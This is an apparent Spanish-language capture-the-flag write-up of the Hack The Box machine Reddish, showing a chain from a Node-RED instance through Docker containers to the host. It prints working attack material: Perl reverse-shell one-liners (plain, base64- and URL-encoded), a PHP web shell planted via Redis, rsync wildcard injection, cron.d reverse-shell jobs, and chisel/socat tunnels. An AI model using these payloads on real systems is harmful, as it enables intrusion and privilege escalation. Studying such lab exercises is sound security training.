---
title: HTB Reddish
date: 2024-04-03 14:10:00 +0800
author: pablo
categories: [HTB, Linux]
tags: [PIVOTING, chisel, socat, File Transfer Tips, rsync, cron exploitation]
image:
  path: /assets/img/Reddish/ReddishPortada.png
---

## Descripción

Reddish es una máquina clasificada como de dificultad `Insane` en HTB y es ideal para prepararse para el [ecPPTV2](https://security.ine.com/certifications/ecppt-certification/), ya que nos permite practicar el pivoting y la transferencia de archivos entre redes. Cuenta con cuatro redes independientes, y para lograr alcance entre ellas, es necesario aplicar técnicas de pivoting, las cuales se llevarán a cabo utilizando herramientas como `chisel` y `socat`.

La intrusión comienza desde una instancia de Node-RED, un editor basado en navegador en JavaScript utilizado para configurar flujos para IoT. Se explotará este servicio para obtener una shell remota en un contenedor. A partir de ahí, será necesario pivotar entre otros tres contenedores, escalando privilegios en uno de ellos, antes de terminar eventualmente en el sistema host. Durante todo este proceso, la conectividad estará limitada al contenedor inicial, por lo que será necesario mantener túneles para la comunicación.

---

## 10.10.10.94

Se comprueba que la máquina está activa y se determina su sistema operativo a través del script implementado en bash `whichSystem.sh`

```bash
❯ ping -c 1 10.10.10.94
PING 10.10.10.94 (10.10.10.94) 56(84) bytes of data.
64 bytes from 10.10.10.94: icmp_seq=1 ttl=63 time=107 ms

--- 10.10.10.94 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 106.909/106.909/106.909/0.000 ms
```

El sistema operativo es una `Linux`

### Nmap

Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de `nmap`. Comando: `sudo nmap -p- --open -sS -T4 -vvv -n -Pn <IP> -oG allPorts`

Puertos abiertos son:

```bash
1880
```

Se procede a realizar un análisis de detección de servicios y la identificación de versiones utilizando los puertos abiertos encontrados.

Comando: `nmap -sCV -p<Ports Open> <IP> -oN targeted`

```bash
## Nmap 7.94 scan initiated Tue Mar 12 10:30:19 2024 as: nmap -p1880 -sCV -oN targeted 10.10.10.94
Nmap scan report for 10.10.10.94
Host is up (0.095s latency).

PORT     STATE SERVICE VERSION
1880/tcp open  http    Node.js Express framework
|_http-title: Error

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
## Nmap done at Tue Mar 12 10:30:35 2024 -- 1 IP address (1 host up) scanned in 16.26 seconds
```

### Port 1880 - `http`

Visitando la pagina web se tiene:

![Untitled](/assets/img/Reddish/Pasted image 20240327173636.png)

se lista un mensaje que el método `GET` no está permitido, por lo cual a través de `curl` se va a realizar una petición al servicio web con el método `POST` obteniendo:

```bash
❯ curl -s -X POST http://10.10.10.94:1880 | jq
{
  "id": "539b28f5b68ba7763e18f1f207d4c5f2",
  "ip": "::ffff:10.10.14.12",
  "path": "/red/{id}"
}
```

se está informando uno a posible ruta, visitando el servicio web:

![Untitled](/assets/img/Reddish/Pasted image 20240327174011.png)

el sitio web está corriendo el servicio de `Node-RED`.

> ¿Qué es Node-RED?
> Node-RED es una herramienta de desarrollo basada en flujo para programación visual desarrollada originalmente por IBM para conectar dispositivos de hardware, API y servicios en línea como parte de la Internet de las cosas.​ [Wikipedia](https://es.wikipedia.org/wiki/Node-RED)

En un `Node-RED` podemos obtener una reverse Shell a través de proporcionar el código disponible en [node-red-reverse-shell.json](https://raw.githubusercontent.com/valkyrix/Node-Red-Reverse-Shell/master/node-red-reverse-shell.json)

Para lo cual vamos a cargar el código en:

![Untitled](/assets/img/Reddish/Pasted image 20240327174355.png)

Importando código

![Untitled](/assets/img/Reddish/Pasted image 20240327174446.png)

Se procede a editar la IP correspondiente a nuestra máquina atacante y el puerto que estará en escucha para obtener la reverse Shell
![Untitled](/assets/img/Reddish/Pasted image 20240327174726.png)

En nuestra máquina atacante se procede a ponerse en escucha a través de `nc` y en el servicio web se ejecuta la instrucción a través de `Deploy`, obteniendo:

![Untitled](/assets/img/Reddish/Pasted image 20240327174948.png)

Como se observa listando el usuario y las interfaces de red, se gana acceso como el usuario `root`, pero actualmente nos encontramos en el segmento de red `172.18.X.X/16` y `172.19.X.X/16`

Para trabajar más cómodamente y tener una Shell totalmente interactiva se gana acceso a través de una reverse Shell en Perl, utilizando:

```bash
perl -e 'use Socket;$i="10.10.14.12";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Descubriendo nuevos hosts

Actualmente nuestra dirección IP corresponde a la `172.18.0.2` y `172.19.0.4` por lo que se tiene alcance a dos segmentos de red.

Creando un script `hostDiscovery.sh` en `bash` para descubrir nuevos hosts activos en la red, a través de:

```bash
##!/bin/bash

hosts=("172.18.0" "172.19.0")

for host in "${hosts[@]}"; do
  echo -e "\n[+] Enumerating $host.0/24\n"
  for i in $(seq 1 254); do
    timeout 1 bash -c "ping -c 1 $host.$i" >/dev/null && echo "[+] Host $host.$i - ACTIVE" &
  done
  wait
done
```

Se puede "transferir" el script codificando el `base64` y en la máquina víctima decodificarlo, se procede a otorgar de permisos de ejecución y ejecutar el script obteniendo:

![Untitled](/assets/img/Reddish/Pasted image 20240327180453.png)

Se descubre cuatro hosts activos, se procede a dibujar el diagrama de red:

![Untitled](/assets/img/Reddish/Pasted image 20240327182025.png)

Leyendas:

- <span style="color:red">nodo rojo</span> → atacante
- <span style="color:yellow">nodo amarillo</span> → Pwned
- <span style="color:green">nodo verde</span> → hostname
- <span style="color:white">nodo blanco</span> → host descubiertos

A través de un script en `bash` se procede a enumerar los puertos abiertos en los hosts correspondientes al segmento `172.18.X.X/16`:

```bash
##!/bin/bash

hosts=("172.18.0.1" "172.19.0.1" "172.19.0.2" "172.19.0.3")

for host in "${hosts[@]}"; do
  echo -e "\n[+] Scanning ports on $host\n"
  for port in $(seq 1 10000); do
    timeout 1 bash -c "echo '' > /dev/tcp/$host/$port" 2> /dev/null && echo -e "\t[+] Port $port - OPEN" &
  done; wait
done
```

Obteniendo:

![Untitled](/assets/img/Reddish/Pasted image 20240327182842.png)

Para enumerar los puertos descubiertos se van a traer a la máquina atacante, para lo cual se va a realizar un reenvío de puertos (port forwarding), tarea que se llevará a cabo mediante la herramienta `Chisel`. Para ello, es necesario transferir el binario de esta herramienta a la máquina víctima.

### Transfer file

Utilizando [Release v1.9.1 · jpillora/chisel · GitHub](https://github.com/jpillora/chisel/releases/tag/v1.9.1)

Se va a transferir chisel al contenedor a través de `nc`

```bash
##Maquina victima - receptor <IPEmisor>
cat > chisel < /dev/tcp/<10.10.14.12>/444

##Maquina atacante - emisor
nc -nlvp 444 < chisel

##Comprobar integridad con md5sum
```

### Port Forwarding - `Chisel`

Trayéndonos los puertos:

- `172.19.0.2` → `6379`
- `172.19.0.3` → `80`

A través de:

```bash
##Maquina victima
 ./chisel client 10.10.14.12:1234 R:127.0.0.1:6379:172.19.0.2:6379 R:127.0.0.1:80:172.19.0.3:80

 #Maquina atacante
 ./chisel server --reverse -p 1234
```

Obteniendo:

![Untitled](/assets/img/Reddish/Pasted image 20240327184400.png)

## `172.19.0.2` - `172.19.0.3`

Se procede a enumerar los puertos a través de `nmap`, obteniendo:

![Untitled](/assets/img/Reddish/Pasted image 20240327184900.png)

### Port 80 - `http`

Visitando el servicio web:

![Untitled](/assets/img/Reddish/Pasted image 20240327185159.png)

Inspeccionando el código fuente se obtiene una posible ruta:

![Untitled](/assets/img/Reddish/Pasted image 20240327185529.png)

### Redish Explotation

Se va a explotar el servicio de redish a traves de [Redis Remote Command Execution ≈ Packet Storm](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)

Se va a tratar de subir una consola `.php`

```php





<?php
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>



```

> Para que la consola pueda ser subida correctamente se recomienda dejar tres saltos de línea al comienzo y final

Utilizando los comandos:

```bash
❯ redis-cli -h 127.0.0.1 flushall
OK
❯ cat shell.php | redis-cli -h 127.0.0.1 -x set crackit
OK
❯ redis-cli -h 127.0.0.1 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4/
OK
❯ redis-cli -h 127.0.0.1 config set dbfilename "shell.php"
OK
❯ redis-cli -h 127.0.0.1 save
OK
```

![Untitled](/assets/img/Reddish/Pasted image 20240312153815.png)

> Se recomienda recopilar los comandos en un script de bash, ya que el servicio web se reinicia constantemente y borra lo cargado.

Obteniendo:

![Untitled](/assets/img/Reddish/Pasted image 20240312153834.png)

![Untitled](/assets/img/Reddish/Pasted image 20240312154712.png)

![Untitled](/assets/img/Reddish/Pasted image 20240312163034.png)

Se dispone de ejecución remota de comandos.

Recordar el segmento de red:

![Untitled](/assets/img/Reddish/Pasted image 20240327193843.png)

La máquina atacante no tiene comunicación directa con el host `172.19.0.3 - 172.20.0.2`. Por lo tanto, se requiere enviar un reverse shell a la máquina `Nodered`, que actuará como intermediaria. Esta última estará a la escucha mediante `socat` y reenviará el tráfico a nuestra máquina atacante, dado que sí tiene comunicación con esta última.

### `Socat` - Reverse Shell

Se gana acceso nuevamente a la máquina `nodered` y utilizando la máquina `nodered` como intermediaria para que redireccione el tráfico hacia nuestra máquina atacante

![Untitled](/assets/img/Reddish/Pasted image 20240312163153.png)

El binario de `socat` se encuentra disponible en [static-binaries/binaries/linux/x86_64/socat at master · andrew-d/static-binaries · GitHub](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)

Transfiriendo a la máquina `nodered`

```bash
##Maquina victima - receptor <IPEmisor>
cat > socat < /dev/tcp/<10.10.14.12>/444

##Maquina atacante - emisor
nc -nlvp 444 < socat

##Comprobar integridad con md5sum
```

Preparando el túnel a través de:

```bash
##Maquina Node-RED
./socat TCP-LISTEN:7979,fork TCP:10.10.14.12:5555 &

##Maquina atacante
nc -nlvp 5555

```

En la web Shell ejecutamos:

```bash
perl -e 'use Socket;$i="172.19.0.4";$p=7979;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Para que esto funcione de la manera correcta debe estar en codeado a `URL`

A traves de `BurpSuite`

![Untitled](/assets/img/Reddish/Pasted image 20240313114502.png)

Obteniendo así:

```bash
%70%65%72%6c%20%2d%65%20%27%75%73%65%20%53%6f%63%6b%65%74%3b%24%69%3d%22%31%37%32%2e%31%39%2e%30%2e%34%22%3b%24%70%3d%37%39%37%39%3b%73%6f%63%6b%65%74%28%53%2c%50%46%5f%49%4e%45%54%2c%53%4f%43%4b%5f%53%54%52%45%41%4d%2c%67%65%74%70%72%6f%74%6f%62%79%6e%61%6d%65%28%22%74%63%70%22%29%29%3b%69%66%28%63%6f%6e%6e%65%63%74%28%53%2c%73%6f%63%6b%61%64%64%72%5f%69%6e%28%24%70%2c%69%6e%65%74%5f%61%74%6f%6e%28%24%69%29%29%29%29%7b%6f%70%65%6e%28%53%54%44%49%4e%2c%22%3e%26%53%22%29%3b%6f%70%65%6e%28%53%54%44%4f%55%54%2c%22%3e%26%53%22%29%3b%6f%70%65%6e%28%53%54%44%45%52%52%2c%22%3e%26%53%22%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%22%29%3b%7d%3b%27
```

![Untitled](/assets/img/Reddish/Pasted image 20240312165350.png)

Obteniendo así:

![Untitled](/assets/img/Reddish/Pasted image 20240312165601.png)

## 172.20.0.2 - 172.19.0.3

La máquina `www-data` dispone de dos interfaces de red la `172.20.X.X/16` y `172.19.X.X/16`

![Untitled](/assets/img/Reddish/Pasted image 20240327201425.png)

### PrivEsc

Elaborando un script en Bash que enumere las tareas en curso a intervalos regulares de tiempo.

```bash
##!/bin/bash

old_process=$(ps -eo command)

while true; do
  new_process=$(ps -eo command)
  diff <(echo "$old_process") <(echo "$new_process") | grep "[\\>\\<]" | grep -vE "command|procmon|kworker"
  old_process=$new_process
done

```

Obteniendo:

![Untitled](/assets/img/Reddish/Pasted image 20240327203957.png)

Se está ejecutando un archivo `/backup/backup.sh`

Enumerando a traves de tareas cron se tiene:

![Untitled](/assets/img/Reddish/Pasted image 20240312181224.png)

Existe una tarea que el usuario `root` estará ejecutando cada tres minutos![Untitled](/assets/img/Reddish/Pasted image 20240312181441.png)

Listando este archivo se tiene:

![Untitled](/assets/img/Reddish/Pasted image 20240312181539.png)

Se va a abusar del comando `rsync`, ya que se está utilizando `wildcards` para su ejecución por lo que se va a crear dos archivos en la ruta `/var/www/html/f187a0ec71ce99642e4f0afbd441a68b`

```bash
echo 'chmod u+s /bin/bash' > test.rdb
touch -- '-e sh test.rdb'
```

![Untitled](/assets/img/Reddish/Pasted image 20240313115857.png)

Luego de un momento se obtiene:

![Untitled](/assets/img/Reddish/Pasted image 20240312182615.png)

La `bash` ha cambiado a `SUID`

Ejecutando una consola como el usuario `root`

![Untitled](/assets/img/Reddish/Pasted image 20240312182716.png)

### Reverse shell `www-data` → Máquina atacante

Una forma alternativa de escalar privilegios es hacer que la máquina víctima `www-data` mande una reverse shell a la maquina atacante, ya que el usuario que esta ejecutando el archivo es `root`

Para enviar una reverse shell desde la máquina `www-data`, correspondiente a las direcciones IP `172.20.0.2` y `172.19.0.3`, utilizaremos el túnel previamente establecido con `socat` en la máquina `nodered`. Por lo tanto, ahora el archivo `tet.rdb` contendrá un one-liner que enviará una reverse Shell hacia la máquina `172.19.0.4`, donde se encuentra activo `socat`. Posteriormente, la máquina `172.19.0.4 - nodered` redirigirá el tráfico hacia nuestra máquina atacante.

```bash
perl -e 'use Socket;$i="172.19.0.4";$p=7979;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Codificando en `base64`

Transfiriendo a la máquina víctima decodificando y guardando la salida en el archivo `test.rdb`

```bash
> echo 'cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuNCI7JHA9Nzk3OTtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg==' | base64 -d > test.rdb
> touch -- '-e sh test.rdb'
```

Obteniendo:

![Untitled](/assets/img/Reddish/Pasted image 20240313123440.png)

Dirigiéndonos a la ruta `/backup/` y analizando el contenido de este archivo nos percatamos que existe un servicio en el puerto `873`

![Untitled](/assets/img/Reddish/Pasted image 20240313120309.png)

Realizando un `ping` a `backup` nos responde la IP `172.20.0.3` por lo que disponemos de una nueva IP para enumerar

![Untitled](/assets/img/Reddish/Pasted image 20240327211500.png)

Dibujando el diagrama de red hasta el momento tenemos:

![Untitled](/assets/img/Reddish/Pasted image 20240327211921.png)

Actualmente somos el usuario `www` el cual dispone de las IP's `172.19.0.3` y `172.20.0.3`

### Enumeración `rsync`

Enumerando el servicio `rsync` se tiene:

![Untitled](/assets/img/Reddish/Pasted image 20240313131253.png)

Vamos a transferir el `socat` a través de `curl` como la máquina no dispone nativamente de curl lo podemos realizar utilizando una función disponible en [command line - how to download a file using just bash and nothing else (no curl, wget, perl, etc.) - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et)

```bash
function __curl() {
  read -r proto server path <<<"$(printf '%s' "${1//// }")"
  if [ "$proto" != "http:" ]; then
    printf >&2 "sorry, %s supports only http\n" "${FUNCNAME[0]}"
    return 1
  fi
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [ "${HOST}" = "${PORT}" ] && PORT=80

  exec 3<>"/dev/tcp/${HOST}/$PORT"
  printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3
  (while read -r line; do
   [ "$line" = $'\r' ] && break
  done && cat) <&3
  exec 3>&-
}
```

Se a emplear el túnel `socat` desde la máquina `node-RED`, que está comunicada con nuestra máquina de ataque. En nuestra máquina de ataque, estableceremos un servidor con Python en el puerto `5555`, el mismo que definimos en la configuración de la máquina `node-RED` para la redirección del tráfico.

- Socat

![Untitled](/assets/img/Reddish/Pasted image 20240313152426.png)

- Transfiriendo `socat` a `www`

![Untitled](/assets/img/Reddish/Pasted image 20240313152534.png)

La razón para transferir `socat` a la máquina `www` radica en la capacidad que tenemos para cargar archivos en la máquina `172.20.0.3`. Aprovecharemos esta capacidad para enviar una reverse shell a nuestra máquina actual, la `172.20.0.2.

![Untitled](/assets/img/Reddish/Pasted image 20240327213458.png)

Vamos a cargar un archivo `reverse` el cual contendrá una instrucción `cron.d` para que la máquina `172.20.0.3` realice cada minuto![Untitled](/assets/img/Reddish/Pasted image 20240313154032.png)

Subiendo el archivo `reverse` a la máquina `172.20.0.3` en el directorio `/etc/cron.d`

A través de;

```bash
rsync reverse rsync://172.20.0.3/src/etc/cron.d
```

Comprobando que el archivo se haya subido correctamente:

![Untitled](/assets/img/Reddish/Pasted image 20240327214036.png)

Vamos a subir nuestro archivo `reverse.sh` el cual contendrá la instrucción en perl para mandar una reverse shell

```bash
perl -e 'use Socket;$i="172.20.0.2";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Subiendo el `reverse.sh` a través de:

```bash
rsync reverse.sh rsync://172.20.0.3/src/tmp/reverse.sh
```

Comprobando que se subió![Untitled](/assets/img/Reddish/Pasted image 20240313155401.png)
Poniéndonos en escucha a través de `socat`

```bash
./socat TCP-LISTEN:7777 stdout
```

Obteniendo:

![Untitled](/assets/img/Reddish/Pasted image 20240328111354.png)

## Intrusión→ Máquina Base 10.10.10.94

Actualmente nos encontramos en la máquina `172.20.0.3 - backup` como el usuario `root`

Enumerando la máquina se encuentra particiones de discos y se va a proceder a montarlos:

![Untitled](/assets/img/Reddish/Pasted image 20240313160619.png)

Montándonos la ruta `/dev/sda2`

![Untitled](/assets/img/Reddish/Pasted image 20240313160907.png)

Para ganar una consola interactiva se va a seguir el mismo procedimiento anterior de las tareas `cron`

Realizando un archivo `tarea` que contendrá:

```bash
* * * * *  root sh /tmp/reverse.sh
```

Copiándolo en la ruta:

```bash
cp tarea ./mnt/test/etc/cron.d
```

y el archivo `reverse.sh` contendrá una instrucción en perl que nos mandara una consola a nuestra IP atacante

```bash
perl -e 'use Socket;$i="10.10.14.12";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

![Untitled](/assets/img/Reddish/Pasted image 20240313162950.png)

Obteniendo:

![Untitled](/assets/img/Reddish/Pasted image 20240328113852.png)

Se habrá ganado acceso a la máquina base `10.10.10.94`

![Untitled](/assets/img/Reddish/Pasted image 20240328114000.png)

Nuestro esquema final de red quedará de la siguiente manera:

![Untitled](/assets/img/Reddish/Pasted image 20240328114032.png)
